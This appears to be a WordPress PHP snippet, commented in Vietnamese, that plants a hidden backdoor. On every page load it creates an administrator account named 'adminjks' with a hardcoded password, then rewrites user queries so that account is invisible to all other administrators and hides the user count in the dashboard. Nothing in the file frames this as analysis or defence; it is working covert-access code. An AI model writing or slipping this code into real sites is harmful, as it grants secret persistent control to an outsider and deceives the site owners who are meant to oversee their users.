<?php
// Tạo tài khoản root
function jks_add_admin_acct(){
    $login = 'adminjks';
    $passw = 'JKSadmin123@';
    $email = 'dev@jks.vn';

    if ( !username_exists( $login )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $login, $passw, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
}
add_action('init','jks_add_admin_acct');


// Ẩn thông tin tài khoản root
/********************************************************************/  
add_action('pre_user_query','jks_pre_user_query');
function jks_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;
  if ($username == 'adminjks') {
  }
  else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'adminjks'",$user_search->query_where);
  }
}
function hide_user_count(){
    ?>
    <style>
    .wp-admin.users-php span.count {display: none;}
    </style>
    <?php
}
add_action('admin_head','hide_user_count');
